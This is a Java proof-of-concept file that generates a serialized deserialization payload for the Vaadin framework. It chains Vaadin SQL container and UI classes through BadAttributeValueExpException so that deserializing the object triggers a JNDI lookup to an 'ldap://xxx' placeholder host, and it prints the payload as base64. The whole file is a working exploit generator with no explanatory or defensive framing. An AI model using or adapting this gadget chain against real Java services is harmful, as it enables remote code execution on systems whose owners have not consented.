package com.example.Vaadin;

import com.example.Utils.Encoder;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.vaadin.data.util.PropertysetItem;
import com.vaadin.data.util.sqlcontainer.RowId;
import com.vaadin.data.util.sqlcontainer.SQLContainer;
import com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;
import com.vaadin.data.util.sqlcontainer.query.TableQuery;
import com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;
import com.vaadin.ui.ListSelect;

import javax.management.BadAttributeValueExpException;
import java.util.ArrayList;

public class POC_1 {

    public static void main(String[] args) throws Exception {
        J2EEConnectionPool pool = new J2EEConnectionPool("ldap://xxx");

        TableQuery tableQuery = (TableQuery) ReflectionUtil.createWithoutConstructor(Class.forName("com.vaadin.data.util.sqlcontainer.query.TableQuery"));
        ReflectionUtil.setField(tableQuery, "primaryKeyColumns", new ArrayList<>());
        ReflectionUtil.setField(tableQuery, "fullTableName", "test");
        ReflectionUtil.setField(tableQuery, "sqlGenerator", new DefaultSQLGenerator());
        ReflectionUtil.setField(tableQuery, "connectionPool", pool);

        ListSelect listSelect = new ListSelect();
        SQLContainer sql = (SQLContainer) ReflectionUtil.createObject("com.vaadin.data.util.sqlcontainer.SQLContainer", new Class[]{}, new Object[]{});
        ReflectionUtil.setField(sql, "queryDelegate", tableQuery);

        RowId id = new RowId("id");
        ReflectionUtil.setField(listSelect, "value", id);
        ReflectionUtil.setField(listSelect, "multiSelect", true);
        ReflectionUtil.setField(listSelect, "items", sql);
        PropertysetItem propertysetItem = new PropertysetItem();
        propertysetItem.addItemProperty("key", listSelect);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(0);
        ReflectionUtil.setField(bad, "val", propertysetItem);
        System.out.println(Encoder.encodeBase64(SerializeUtil.serialize(bad)));

//        SerializeUtil.deserialize(SerializeUtil.serialize(bad));
    }

}
